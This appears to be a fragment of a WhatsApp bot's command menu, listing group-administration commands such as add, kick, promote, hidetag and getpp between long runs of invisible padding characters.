‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
▯ ⍟ ${prefix}add
▯ ⍟ ${prefix}kick
▯ ⍟ ${prefix}promote
▯ ⍟ ${prefix}demote
▯ ⍟ ${prefix}disappear
▯ ⍟ ${prefix}group
▯ ⍟ ${prefix}antilink
▯ ⍟ ${prefix}totag
▯ ⍟ ${prefix}hidetag
▯ ⍟ ${prefix}translate
▯ ⍟ ${prefix}getdeskgc
▯ ⍟ ${prefix}getbio
▯ ⍟ ${prefix}getdeskgc
▯ ⍟ ${prefix}getpp
▯ ⍟ ${prefix}getname
 ⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭𝙴𝚇𝚃𝚁𝙰 𝙼𝙴𝙽𝚄▭▭▭▭‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎